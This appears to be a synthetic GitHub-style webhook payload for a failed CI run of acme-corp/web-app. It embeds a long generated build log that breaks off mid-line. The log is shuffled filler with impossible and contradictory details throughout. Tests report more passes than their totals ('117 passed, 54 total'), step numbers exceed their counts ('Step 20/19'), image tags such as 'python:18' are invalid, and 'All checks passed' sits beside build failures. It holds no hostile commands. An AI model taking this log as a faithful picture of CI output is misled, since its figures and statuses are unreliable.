{
  "action": "completed",
  "workflow_run": {
    "id": 298,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-878",
    "head_sha": "eb194b8efa91bff38c3cc44817fdb246dc5d774f",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-11T12:46:28.759448Z",
    "updated_at": "2025-12-11T12:50:31.011845Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "eve"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: checkout ===\nWaiting...\nCache saved successfully\n\u2713 build completed\nPlatform: win32-x64\n[12:46:28] DEBUG: Loading configuration\n\u2713 Step 'checkout' succeeded\nTransforming 814 files...\nArtifact uploaded: build.tar.gz (39MB)\nFetching from https://npmjs.org/package.json\nCache invalidated: node_modules\nCache miss for key-3008\nCompiling src/service.java...\n\u2713 lint completed\n[12:46:28] INFO: Connecting to database\nStep 2/18: Linting\nTests: 117 passed, 54 total\nTLS handshake completed\nCompleted.\nTLS handshake completed\nGET /health - 204 (24ms)\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Step 'install' succeeded\nEnvironment: development\nCache invalidated: build\nPulling image: python:18\nCache restored successfully (469MB)\nCache miss for key-6345\nWaiting...\nTransforming 923 files...\n\u2713 Task completed in 2170ms\nPOST /data - 201 (197ms)\nSnapshots: 20 passed, 8 total\nException: TypeError\nVerifying...\nPulling image: python:3.11\nInstalling express@3.1.8\nnpm notice: created a lockfile\nWARNING: lodash has known vulnerabilities\nTests: 428 passed, 434 total\npip: Collecting webpack\nOK\nGET /health - 200 (1ms)\nnpm install: added 442 packages\nStep 12/21: Linting\nStep 8/15: Running migrations\nCompiling utils/service.java...\nLayer 3/13: ENV command\nStep 12/15: Deploying\nStep 16/22: Installing dependencies\nCoverage: 98% statements, 79% branches\n  PASS: unit/test_cache_hit.spec.js\nCompiling components/service.java...\nWARNING: express has known vulnerabilities\nWARNING: lodash has known vulnerabilities\nWARNING: prettier has known vulnerabilities\nLoading...\nCache miss for key-7661\nDone.\n[12:46:28] DEBUG: Query executed in 71ms\nAlready up to date.\nCache saved successfully\nStep 20/19: Testing\nSuccess!\nUsing Node.js 14.8.6\nPulling image: node:3.11\nOK\nTests: 302 passed, 181 total\nReady.\nLayer 8/9: COPY command\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: created a lockfile\n[12:46:28] INFO: Starting build process\nSwitched to branch 'feature/task-226'\nSnapshots: 48 passed, 32 total\nStep 11/25: Building\nGET /status - 200 (56ms)\nnpm install: added 62 packages\nFAILED: test_auth_login\nFetching from https://githubusercontent.com/package.json\nUsing Python 3.12\nCreating production build...\nnpm install: added 314 packages\n[12:46:28] INFO: Connecting to database\n[12:46:28] DEBUG: Initializing service\nOK\nBuilding Docker image...\nFAILED: test_cache_hit\nnpm notice: package.json updated\n\u2713 Task completed in 2681ms\nBuilding Docker image...\nCompiling components/index.js...\nFAILED: test_cache_hit\n[12:46:28] WARN: Deprecated API usage\nWaiting...\nTests: 58 passed, 450 total\nLayer 10/12: RUN command\nStep 1/17: Installing dependencies\n[12:46:28] DEBUG: Loading configuration\nFinished.\nOptimizing 18 modules...\nSwitched to branch 'feature/task-556'\nHEAD is now at 2e1682c\nAlready up to date.\n[12:46:28] INFO: Processing request\nLoading...\nnpm install: added 461 packages\nCache hit for key-2884\nArtifact downloaded: 30MB\nUsing Node.js 14.13.6\nCache restored successfully (353MB)\nUsing Node.js 17.16.9\nWARNING: prettier has known vulnerabilities\nWARNING: webpack has known vulnerabilities\nPushing to registry...\nFinished.\nSuccess!\nnpm notice: created a lockfile\nMinifying main.js\nCompiling utils/app.ts...\nUploading artifact 'build' (22 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: dist.zip (5MB)\n  PASS: integration/test_auth_login.spec.js\nNODE_ENV=development\n[12:46:28] WARN: Deprecated API usage\nPlatform: linux-x64\nWARNING: axios has known vulnerabilities\nTLS handshake completed\nSnapshots: 14 passed, 4 total\n\u2713 test completed\nCoverage: 89% statements, 87% branches\n[12:46:28] DEBUG: Loading configuration\nTests: 152 passed, 237 total\nCompleted.\nTLS handshake completed\nChecking out master branch\nPushing to registry...\nReady.\nGET /health - 201 (1ms)\n\u2717 build failed with exit code 115\nnpm install: added 17 packages\nAlready up to date.\nRan 138 tests in 34s\nCompiling components/handler.rs...\nStep 14/24: Deploying\nTests: 126 passed, 293 total\n[12:46:28] DEBUG: Loading configuration\nTransforming 760 files...\nSuccess!\n[12:46:28] INFO: Cache refreshed\nUsing Node.js 17.7.10\nCache miss for key-5062\n=== Step checkout completed ===\n=== Step: save_cache ===\nArtifact uploaded: build.tar.gz (17MB)\nDone.\npip: Downloading prettier-2.7.tar.gz\nStep 18/15: Linting\n[12:46:28] INFO: Processing request\nChecking out develop branch\nCompiling utils/utils.go...\nPOST /upload - 201 (374ms)\n[12:46:28] WARN: Deprecated API usage\nUsing Node.js 15.2.5\nnpm notice: package.json updated\n[12:46:28] DEBUG: Memory usage: 1176MB\nTests: 344 passed, 105 total\nStep 14/17: Deploying\nStep 10/25: Testing\n[12:46:28] DEBUG: Memory usage: 1665MB\n\u2717 build failed with exit code 15\nStep 9/18: Installing dependencies\n[12:46:28] INFO: Starting build process\nnpm install: added 302 packages\n  PASS: test_db_connect (328ms)\nOptimizing 83 modules...\nBundling runtime.js\nTransforming 757 files...\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 All checks passed\nFetching from https://githubusercontent.com/package.json\nCompiling utils/main.py...\nEnvironment: test\nDone.\n  PASS: unit/test_cache_hit.spec.js\n[12:46:28] DEBUG: Query executed in 24ms\nStep 9/20: Linting\nWARNING: lodash has known vulnerabilities\nRan 30 tests in 9s\nLayer 4/14: RUN command\nLoading...\nWaiting...\nException: TypeError\nSwitched to branch 'bugfix/task-274'\nCoverage: 88% statements, 75% branches\nGET /api - 204 (35ms)\nConnection established\nCreating production build...\nInstalling eslint@5.7.5\nArtifact downloaded: 26MB\n[12:46:28] DEBUG: Initializing service\nException: ValueError\n\u2717 build failed with exit code 74\npip: Collecting lodash\nCompiling src/handler.rs...\nProcessing...\npip: Collecting eslint\nCompleted.\nFetching submodules...\n\u2713 Step 'setup' succeeded\nHEAD is now at e481daf\nAlready up to date.\nTransforming 535 files...\n[12:46:28] INFO: Processing request\nAlready up to date.\nCompiling utils/handler.rs...\nTLS handshake completed\nPlatform: win32-x64\n\u2713 Step 'checkout' succeeded\nStep 2/15: Building\n[12:46:28] DEBUG: Query executed in 95ms\nTime: 40.978s\nLoading...\nStep 3/23: Running migrations\nCache hit for key-8695\n[12:46:28] DEBUG: Connection pool: 10 active\nCache miss for key-7441\nCompiling utils/utils.go...\nFinished.\nStep 13/16: Building\nnpm install: added 453 packages\n[12:46:28] INFO: Connecting to database\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:28] INFO: Cache refreshed\n[12:46:28] INFO: Processing request\n[12:46:28] INFO: Processing request\nUploading artifact 'dist' (14 files)\n\u2713 build completed\nStep 19/18: Deploying\nStep 9/24: Installing dependencies\n[12:46:28] DEBUG: Connection pool: 4 active\n[12:46:28] INFO: Processing request\nTLS handshake completed\nTime: 78.421s\nOptimizing 43 modules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: added 56 packages\nWaiting...\nTLS handshake completed\nConnection established\nCache hit for key-9053\nnpm install: added 471 packages\nUsing Node.js 19.19.7\nStep 10/20: Running migrations\nnpm notice: created a lockfile\nStep 3/18: Testing\nTransforming 660 files...\nnpm notice: package.json updated\nFetching from https://npmjs.org/package.json\nStep 3/21: Testing\nCache miss for key-5526\nHEAD is now at 6eb4b87\n[12:46:28] DEBUG: Loading configuration\nArtifact downloaded: 30MB\n[12:46:28] INFO: Starting build process\n  PASS: integration/test_api_health.spec.js\nOK\nPlatform: darwin-arm64\nCache restored successfully (16MB)\nCompiling src/utils.go...\nStep 9/19: Running migrations\nProcessing...\n[12:46:28] INFO: Request completed\nCoverage: 75% statements, 94% branches\nStep 1/21: Linting\nRan 12 tests in 44s\nnpm install: resolved 1902 packages\nCreating production build...\nVerifying...\nCompiling src/handler.rs...\nBundling vendor.css\n  PASS: test_cache_hit (406ms)\nyarn add: Done in 11.68s\nCache hit for key-1533\nCompleted.\nArtifact uploaded: dist.zip (10MB)\n[12:46:28] INFO: Processing request\nProcessing...\nStep 14/23: Installing dependencies\nyarn add: Done in 3.34s\nUploading artifact 'dist' (21 files)\nReady.\nArtifact uploaded: build.tar.gz (26MB)\npip install: Successfully installed axios-5.20\nConnection established\n\u2713 Step 'install' succeeded\nCreating production build...\nWARNING: react has known vulnerabilities\nStep 5/18: Running migrations\nStep 5/25: Testing\nLoading...\nUsing Node.js 18.9.1\nOptimizing 75 modules...\nHEAD is now at c22433a\nSuccess!\n[12:46:28] INFO: Cache refreshed\n=== Step save_cache completed ===\n=== Step: deploy_production ===\nStep 17/18: Running migrations\nTime: 19.600s\nTest Suites: 8 passed, 45 total\n[12:46:28] WARN: Deprecated API usage\nBundling styles.css\nAlready up to date.\nBundling vendor.js\nPOST /data - 201 (198ms)\n[12:46:28] DEBUG: Query executed in 91ms\n[12:46:28] DEBUG: Memory usage: 157MB\nyarn add: Done in 25.59s\n[12:46:28] DEBUG: Connection pool: 17 active\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPOST /data - 200 (68ms)\nFinished.\nCoverage: 94% statements, 94% branches\nStep 18/18: Linting\nUploading artifact 'coverage' (1 files)\n[12:46:28] WARN: Deprecated API usage\nCache invalidated: dependencies\nPOST /upload - 202 (159ms)\nPushing to registry...\nCache miss for key-6811\nCache miss for key-3437\nTests: 116 passed, 220 total\nTransforming 110 files...\n[12:46:28] INFO: Request completed\nCoverage: 71% statements, 72% branches\nGET /api - 204 (28ms)\nLoading...\nWARNING: express has known vulnerabilities\nCoverage: 72% statements, 74% branches\nBuilding Docker image...\nArtifact uploaded: dist.zip (13MB)\nnpm notice: package.json updated\nStep 20/21: Running migrations\nImage pulled successfully\nnpm install: resolved 1523 packages\nStep 14/21: Linting\nCompiling lib/service.java...\nArtifact uploaded: build.tar.gz (39MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling prettier@5.13.7\nCompiling components/handler.rs...\nOptimizing 60 modules...\nFAILED: test_api_health\nEnvironment: production\nCache miss for key-7423\n[12:46:28] DEBUG: Query executed in 83ms\nSwitched to branch 'hotfix/task-462'\nWARNING: axios has known vulnerabilities\n\u2713 deploy completed\npip: Downloading jest-2.5.tar.gz\nProcessing...\nTime: 21.98s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: added 249 packages\nCompiling utils/handler.rs...\nStep 9/21: Building\n[12:46:28] WARN: Deprecated API usage\nChecking out main branch\nPulling image: alpine:18\n[12:46:28] WARN: Deprecated API usage\nTest Suites: 32 passed, 17 total\nCache hit for key-8225\n[12:46:28] INFO: Request completed\nTime: 46.802s\npip: Downloading prettier-1.16.tar.gz\n\u2713 Step 'setup' succeeded\n  PASS: unit/test_cache_hit.spec.js\nFinished.\nMinifying main.js\nProcessing...\nUsing Node.js 14.11.7\nCompleted.\n  PASS: unit/test_api_health.spec.js\nSnapshots: 8 passed, 24 total\nSuccess!\nLoading...\nNODE_ENV=test\npip: Downloading express-4.13.tar.gz\nStep 7/17: Building\nStep 20/23: Linting\n[12:46:28] WARN: Deprecated API usage\nnpm notice: package.json updated\nArtifact downloaded: 25MB\nGET /status - 204 (75ms)\nCompiling lib/handler.rs...\nEnvironment: production\nArtifact downloaded: 39MB\nFetching submodules...\n[12:46:28] WARN: Deprecated API usage\npip: Installing build dependencies...\n\u2713 Step 'checkout' succeeded\nUploading artifact 'coverage' (39 files)\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (50MB)\nStep 20/19: Installing dependencies\nStep 18/19: Deploying\nRan 64 tests in 40s\n[12:46:28] INFO: Starting build process\nPushing to registry...\nDone.\nWARNING: react has known vulnerabilities\nUploading artifact 'build' (42 files)\nFetching from https://npmjs.org/package.json\nWaiting...\nInstalling react@2.3.1\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Collecting express\n[12:46:28] INFO: Request completed\npip: Installing build dependencies...\nBuilding Docker image...\nTime: 92.183s\nCompiling lib/app.ts...\nFinished.\npip install: Successfully installed prettier-5.0\n  PASS: unit/test_api_health.spec.js\nChecking out master branch\nStep 18/19: Deploying\n[12:46:28] DEBUG: Query executed in 64ms\nException: TypeError\nInstalling prettier@4.19.9\n\u2713 All checks passed\nCache miss for key-6260\nAlready up to date.\nnpm notice: created a lockfile\nImage pulled successfully\nOK\n  PASS: e2e/test_auth_login.spec.js\nPulling image: node:18\n  PASS: e2e/test_auth_login.spec.js\n[12:46:28] INFO: Cache refreshed\npip: Downloading eslint-5.19.tar.gz\nSwitched to branch 'hotfix/task-100'\n[12:46:28] DEBUG: Initializing service\nProcessing...\nCache invalidated: build\nGET /api - 204 (86ms)\nLoading...\n[12:46:28] INFO: Connecting to database\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGenerating source maps...\n  PASS: test_user_create (410ms)\nCompiling utils/utils.go...\nCompiling utils/handler.rs...\nCache miss for key-4614\npip: Collecting jest\n[12:46:28] DEBUG: Loading configuration\nArtifact downloaded: 13MB\nFAILED: test_api_health\nInstalling react@5.12.6\n=== Step deploy_production completed ===\n=== Step: deploy_staging ===\nStep 2/23: Linting\npip: Installing build dependencies...\nStep 14/16: Testing\nCompiling src/index.js...\nMinifying app.js\nProcessing...\n\u2713 Task completed in 3595ms\n[12:46:28] DEBUG: Query executed in 56ms\nyarn add: Done in 21.3s\nReady.\nyarn add: Done in 5.54s\nCache hit for key-4255\nWARNING: eslint has known vulnerabilities\nAlready up to date.\nnpm install: added 63 packages\n\u2713 lint completed\nnpm install: resolved 1701 packages\nGET /status - 201 (74ms)\nRan 63 tests in 30s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: e2e/test_db_connect.spec.js\nVerifying...\n[12:46:28] DEBUG: Memory usage: 522MB\nCache saved successfully\nWaiting...\nStep 8/15: Building\n\u2713 All checks passed\nImage pulled successfully\n[12:46:28] INFO: Connecting to database\nTransforming 545 files...\n  PASS: test_auth_login (461ms)\nCompiling lib/utils.go...\nCache miss for key-6999\nArtifact uploaded: build.tar.gz (11MB)\nInstalling webpack@2.3.2\nSwitched to branch 'bugfix/task-753'\n[12:46:28] WARN: Deprecated API usage\nWARNING: axios has known vulnerabilities\nGET /api - 200 (19ms)\nReady.\nTLS handshake completed\nStep 15/23: Installing dependencies\n\u2713 All checks passed\nSnapshots: 35 passed, 46 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTLS handshake completed\nCreating production build...\nCompiling components/app.ts...\nCompiling src/service.java...\n  PASS: test_db_connect (97ms)\nLayer 9/8: ENV command\nBuilding Docker image...\n[12:46:28] ERROR: Connection failed\nHEAD is now at b0697c0\nSnapshots: 24 passed, 21 total\nPulling image: python:18\n  PASS: test_db_connect (167ms)\nWARNING: express has known vulnerabilities\n\u2713 Task completed in 3711ms\nArtifact downloaded: 44MB\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFinished.\n[12:46:28] DEBUG: Connection pool: 9 active\nChecking out main branch\n[12:46:28] DEBUG: Query executed in 15ms\nStep 13/22: Deploying\nSwitched to branch 'hotfix/task-919'\npip install: Successfully installed axios-2.2\nCompiling lib/index.js...\nCache saved successfully\nInstalling prettier@1.14.1\nDone.\nCache hit for key-3516\nArtifact downloaded: 2MB\n[12:46:28] INFO: Processing request\nFetching submodules...\nArtifact downloaded: 45MB\n[12:46:28] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (17MB)\n[12:46:28] INFO: Connecting to database\nHEAD is now at cbc5f30\nLayer 4/14: RUN command\nInstalling jest@5.2.0\n[12:46:28] INFO: Starting build process\nnpm install: resolved 357 packages\nCompiling components/handler.rs...\nyarn add: Done in 23.41s\nProcessing...\nArtifact downloaded: 16MB\nSuccess!\nTransforming 308 files...\n[12:46:28] WARN: Deprecated API usage\nTime: 112.964s\nArtifact uploaded: dist.zip (85MB)\nHEAD is now at c825078\nUsing Python 3.11\npip: Installing build dependencies...\nGET /api - 204 (57ms)\nCache restored successfully (382MB)\nNODE_ENV=production\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nEnvironment: staging\nOptimizing 68 modules...\nStep 4/15: Linting\nGenerating source maps...\nnpm install: added 25 packages\nTests: 191 passed, 436 total\nReady.\n  PASS: test_user_create (370ms)\nImage pulled successfully\n[12:46:28] INFO: Request completed\n[12:46:28] INFO: Processing request\n  PASS: integration/test_auth_login.spec.js\nCompiling components/handler.rs...\nFetching submodules...\nPOST /upload - 200 (180ms)\nStep 19/23: Linting\nPushing to registry...\nDone.\nnpm install: resolved 309 packages\n\u2713 All checks passed\nCache hit for key-2212\n\u2713 All checks passed\nStep 13/23: Testing\nBuilding Docker image...\nCreating production build...\nyarn add: Done in 24.19s\nStep 17/25: Installing dependencies\nFinished.\nChecking out main branch\n[12:46:28] INFO: Cache refreshed\nCoverage: 76% statements, 70% branches\nVerifying...\nTransforming 837 files...\nFinished.\nFinished.\nArtifact uploaded: build.tar.gz (13MB)\nGET /api - 204 (48ms)\n[12:46:28] DEBUG: Query executed in 13ms\nBuilding Docker image...\n[12:46:28] WARN: Deprecated API usage\nCompiling utils/index.js...\n\u2713 All checks passed\nWARNING: prettier has known vulnerabilities\nRan 124 tests in 20s\nCompiling components/app.ts...\n\u2717 build failed with exit code 23\nTransforming 983 files...\nPushing to registry...\nCompiling utils/main.py...\nWARNING: react has known vulnerabilities\nSnapshots: 37 passed, 34 total\n=== Step deploy_staging completed ===\n=== Step: upload_artifacts ===\nStep 5/22: Running migrations\npip: Downloading prettier-1.15.tar.gz\nInstalling lodash@1.2.8\npip: Installing build dependencies...\n[12:46:28] DEBUG: Memory usage: 1222MB\nPOST /upload - 201 (311ms)\nnpm notice: package.json updated\n[12:46:28] WARN: Deprecated API usage\nUploading artifact 'build' (9 files)\nStep 19/15: Building\nnpm notice: created a lockfile\nGenerating source maps...\nPulling image: node:latest\nTests: 408 passed, 452 total\nStep 13/18: Building\nOptimizing 43 modules...\nCompiling utils/handler.rs...\n[12:46:28] ERROR: Connection failed\nCache saved successfully\n[12:46:28] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (42MB)\nnpm install: added 100 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact downloaded: 14MB\n[12:46:28] DEBUG: Initializing service\nEnvironment: production\nStep 6/21: Testing\nTLS handshake completed\nEnvironment: production\nPOST /data - 201 (178ms)\n[12:46:28] INFO: Cache refreshed\nAlready up to date.\n[12:46:28] DEBUG: Loading configuration\n[12:46:28] INFO: Request completed\nTest Suites: 25 passed, 5 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Step 'install' succeeded\nPushing to registry...\nCompiling components/app.ts...\nSwitched to branch 'feature/task-129'\n[12:46:28] INFO: Processing request\npip install: Successfully installed express-5.4\nWaiting...\nOK\nStep 8/15: Testing\nCache hit for key-9492\n[12:46:28] WARN: Deprecated API usage\nArtifact downloaded: 2MB\nArtifact downloaded: 47MB\nnpm notice: created a lockfile\npip: Collecting lodash\nReady.\nWARNING: express has known vulnerabilities\nCompleted.\nCache invalidated: dependencies\nProcessing...\nWaiting...\n[12:46:28] WARN: Deprecated API usage\nDone.\n[12:46:28] DEBUG: Query executed in 8ms\n\u2713 Task completed in 2385ms\nStep 10/15: Testing\nUploading artifact 'coverage' (23 files)\npip: Installing build dependencies...\nCache miss for key-4129\nSnapshots: 21 passed, 45 total\nCompiling utils/app.ts...\nWaiting...\n[12:46:28] INFO: Request completed\nCache hit for key-3935\n[12:46:28] INFO: Cache refreshed\nyarn add: Done in 5.88s\nSuccess!\nCompiling utils/service.java...\nTests: 225 passed, 488 total\npip: Downloading axios-2.6.tar.gz\npip: Installing build dependencies...\nConnection established\nArtifact uploaded: dist.zip (38MB)\nCompiling src/app.ts...\nCache miss for key-2835\nStep 13/23: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: dist.zip (15MB)\nBundling runtime.css\npip install: Successfully installed lodash-1.16\nNODE_ENV=production\nStep 13/19: Installing dependencies\nPushing to registry...\nWaiting...\n[12:46:28] DEBUG: Memory usage: 489MB\nnpm notice: created a lockfile\n[12:46:28] ERROR: Connection failed\nnpm notice: package.json updated\nyarn add: Done in 19.24s\nProcessing...\nDone.\n\u2713 All checks passed\nConnection established\nCache hit for key-2726\nOK\nCoverage: 89% statements, 96% branches\nFetching submodules...\n[12:46:28] INFO: Starting build process\nCoverage: 79% statements, 65% branches\nnpm install: added 27 packages\nStep 7/25: Deploying\n[12:46:28] DEBUG: Memory usage: 769MB\nCompiling components/service.java...\nnpm install: resolved 1243 packages\nTLS handshake completed\nUploading artifact 'dist' (42 files)\n[12:46:28] DEBUG: Query executed in 96ms\nWARNING: prettier has known vulnerabilities\n\u2713 All checks passed\n[12:46:28] DEBUG: Loading configuration\nLayer 7/12: COPY command\nFetching from https://githubusercontent.com/package.json\nPlatform: darwin-arm64\nConnection established\nCoverage: 74% statements, 76% branches\nNODE_ENV=development\nFAILED: test_auth_login\nConnection established\npip: Collecting eslint\nnpm notice: created a lockfile\nTLS handshake completed\npip: Downloading prettier-2.3.tar.gz\nLayer 3/11: RUN command\nUsing Node.js 17.13.8\nWARNING: axios has known vulnerabilities\nStep 12/15: Deploying\nLayer 4/10: RUN command\n[12:46:28] WARN: Deprecated API usage\nLayer 6/14: RUN command\nEnvironment: production\n[12:46:28] INFO: Request completed\n[12:46:28] DEBUG: Connection pool: 15 active\nArtifact uploaded: dist.zip (6MB)\n[12:46:28] INFO: Cache refreshed\nInstalling express@3.12.6\nProcessing...\nChecking out master branch\nUploading artifact 'dist' (28 files)\nArtifact downloaded: 7MB\nUsing Node.js 18.15.2\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\nFinished.\nCoverage: 92% statements, 81% branches\nPushing to registry...\nnpm install: resolved 1300 packages\nProcessing...\nRan 36 tests in 6s\n=== Step upload_artifacts completed ===\n=== Step: e2e_tests ===\nCompiling components/service.java...\n  PASS: integration/test_auth_login.spec.js\nyarn add: Done in 6.69s\nCompiling lib/index.js...\nSwitched to branch 'bugfix/task-835'\nReady.\nCreating production build...\nSwitched to branch 'hotfix/task-271'\n\u2713 Task completed in 2767ms\nCompiling lib/service.java...\n[12:46:28] DEBUG: Query executed in 100ms\nChecking out develop branch\npip install: Successfully installed axios-3.5\nArtifact uploaded: build.tar.gz (8MB)\nStep 17/21: Deploying\n[12:46:28] WARN: Deprecated API usage\n[12:46:28] DEBUG: Memory usage: 1076MB\nStep 5/25: Building\nStep 9/24: Installing dependencies\nFinished.\nStep 12/18: Linting\nInstalling eslint@4.15.1\nEnvironment: staging\n[12:46:28] INFO: Starting build process\nTLS handshake completed\nOK\n  PASS: test_auth_login (52ms)\nCompiling src/index.js...\nArtifact downloaded: 34MB\npip: Collecting prettier\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPOST /api - 201 (76ms)\nCache invalidated: build\nCache invalidated: build\n[12:46:28] DEBUG: Initializing service\nArtifact uploaded: dist.zip (24MB)\nPushing to registry...\nnpm install: added 387 packages\nTransforming 774 files...\nCache invalidated: build\nStep 16/20: Deploying\nBuilding Docker image...\nReady.\n\u2713 Task completed in 3589ms\n[12:46:28] INFO: Processing request\nWARNING: webpack has known vulnerabilities\npip install: Successfully installed jest-3.18\n[12:46:28] WARN: Deprecated API usage\nCompiling components/main.py...\nInstalling webpack@4.7.7\nSuccess!\nOptimizing 38 modules...\nProcessing...\nCache miss for key-6121\nAlready up to date.\nStep 3/18: Testing\n[12:46:28] DEBUG: Initializing service\n[12:46:28] INFO: Cache refreshed\nSwitched to branch 'feature/task-509'\npip: Downloading jest-5.8.tar.gz\npip: Collecting prettier\nSuccess!\nCompleted.\nChecking out main branch\nnpm notice: created a lockfile\nCoverage: 84% statements, 88% branches\nFetching from https://npmjs.org/package.json\nFetching submodules...\nMinifying main.js\nSnapshots: 36 passed, 44 total\n[12:46:28] DEBUG: Query executed in 75ms\nOptimizing 11 modules...\nNODE_ENV=test\n[12:46:28] INFO: Processing request\n\u2713 package completed\nyarn add: Done in 2.12s\nGET /health - 201 (32ms)\n[12:46:28] DEBUG: Initializing service\nCreating production build...\nUploading artifact 'coverage' (36 files)\npip: Collecting react\n\u2713 Step 'setup' succeeded\n[12:46:28] INFO: Starting build process\nTests: 67 passed, 381 total\nStep 3/20: Building\nCompiling utils/utils.go...\nPulling image: alpine:latest\nArtifact uploaded: build.tar.gz (12MB)\nWaiting...\nUploading artifact 'coverage' (10 files)\nEnvironment: production\n\u2713 validate completed\nBundling runtime.js\nSwitched to branch 'hotfix/task-905'\nnpm install: added 166 packages\n\u2713 All checks passed\nWARNING: axios has known vulnerabilities\n[12:46:28] WARN: Deprecated API usage\nFinished.\nPushing to registry...\nLayer 4/13: COPY command\nnpm notice: created a lockfile\nGET /api - 201 (42ms)\nFinished.\n[12:46:28] ERROR: Connection failed\nNODE_ENV=production\nChecking out main branch\nArtifact uploaded: dist.zip (90MB)\nnpm notice: created a lockfile\n\u2713 validate completed\nTLS handshake completed\nCache restored successfully (368MB)\nOK\n[12:46:28] INFO: Processing request\nEnvironment: production\nStep 7/21: Deploying\n[12:46:28] INFO: Processing request\n[12:46:28] INFO: Cache refreshed\nMinifying vendor.js\nCompiling lib/app.ts...\nPlatform: win32-x64\nStep 1/24: Running migrations\nOK\nNODE_ENV=test\nTLS handshake completed\n[12:46:28] INFO: Request completed\nOptimizing 40 modules...\nImage pulled successfully\npip: Downloading prettier-2.5.tar.gz\nCompiling lib/handler.rs...\nCache invalidated: dependencies\nInstalling axios@4.10.10\nFAILED: test_cache_hit\n\u2713 All checks passed\nTest Suites: 14 passed, 32 total\npip install: Successfully installed lodash-4.18\nUsing Python 3.12\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling lodash@2.9.4\nEnvironment: development\nArtifact downloaded: 47MB\nBuilding Docker image...\nSnapshots: 13 passed, 16 total\nPushing to registry...\nUsing Node.js 20.13.7\nReady.\nRan 100 tests in 56s\n[12:46:28] INFO: Starting build process\n[12:46:28] INFO: Starting build process\nNODE_ENV=test\nSuccess!\nFetching submodules...\nStep 14/18: Running migrations\n=== Step e2e_tests completed ===\n=== Step: setup_node ===\nChecking out master branch\nPlatform: win32-x64\nCreating production build...\n\u2713 Task completed in 587ms\nCache saved successfully\nException: ValueError\n[12:46:28] INFO: Connecting to database\nTransforming 606 files...\nBundling styles.js\nBundling runtime.js\nNODE_ENV=development\nHEAD is now at db54029\nCompleted.\nWARNING: jest has known vulnerabilities\nNODE_ENV=development\nOK\npip install: Successfully installed webpack-1.15\nOptimizing 22 modules...\nyarn add: Done in 21.2s\nCache saved successfully\n[12:46:28] INFO: Connecting to database\nStep 13/20: Building\nUsing Node.js 17.15.8\nnpm notice: created a lockfile\npip: Installing build dependencies...\nAlready up to date.\nStep 8/17: Deploying\nWARNING: lodash has known vulnerabilities\n\u2713 Step 'checkout' succeeded\nCompiling utils/main.py...\n[12:46:28] DEBUG: Connection pool: 11 active\nVerifying...\nnpm notice: created a lockfile\n[12:46:28] INFO: Starting build process\nnpm notice: created a lockfile\nPushing to registry...\nWARNING: express has known vulnerabilities\n[12:46:28] INFO: Starting build process\nBuilding Docker image...\nCompiling lib/main.py...\nSnapshots: 3 passed, 18 total\nFetching from https://githubusercontent.com/package.json\n[12:46:28] DEBUG: Connection pool: 17 active\n[12:46:28] INFO: Request completed\n[12:46:28] INFO: Connecting to database\nTests: 297 passed, 68 total\nPOST /upload - 200 (89ms)\nUsing Node.js 19.6.7\nUsing Python 3.12\npip install: Successfully installed axios-1.4\nTime: 102.950s\n\u2713 Task completed in 4545ms\nFetching submodules...\n[12:46:28] WARN: Deprecated API usage\nFetching submodules...\nCompiling lib/app.ts...\npip: Downloading react-3.14.tar.gz\nReady.\nConnection established\nCompiling src/index.js...\nConnection established\n[12:46:28] DEBUG: Memory usage: 1756MB\nSnapshots: 45 passed, 14 total\nGenerating source maps...\nPushing to registry...\nInstalling eslint@5.9.7\nMinifying vendor.js\nTest Suites: 5 passed, 16 total\nStep 1/17: Building\nStep 9/18: Testing\nStep 18/25: Running migrations\nnpm install: resolved 123 packages\nWaiting...\nnpm install: resolved 1577 packages\nProcessing...\n[12:46:28] DEBUG: Memory usage: 1466MB\n\u2713 All checks passed\nReady.\n\u2713 Task completed in 278ms\nAlready up to date.\nReady.\nTest Suites: 17 passed, 8 total\nTest Suites: 40 passed, 47 total\nPOST /upload - 200 (209ms)\n[12:46:28] DEBUG: Memory usage: 1140MB\n\u2713 All checks passed\n[12:46:28] WARN: Deprecated API usage\nFetching from https://registry.npmjs.org/package.json\n[12:46:28] INFO: Request completed\nPulling image: node:latest\nnpm install: added 78 packages\n[12:46:28] DEBUG: Initializing service\nTransforming 127 files...\nnpm install: resolved 1900 packages\nCache hit for key-9417\n[12:46:28] WARN: Deprecated API usage\nCompiling components/app.ts...\nStep 5/17: Testing\nWARNING: prettier has known vulnerabilities\nnpm notice: created a lockfile\nSuccess!\nCompiling components/handler.rs...\npip install: Successfully installed axios-3.17\nAlready up to date.\nDone.\nLayer 6/14: RUN command\n  PASS: e2e/test_user_create.spec.js\nFetching from https://docker.io/package.json\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFetching 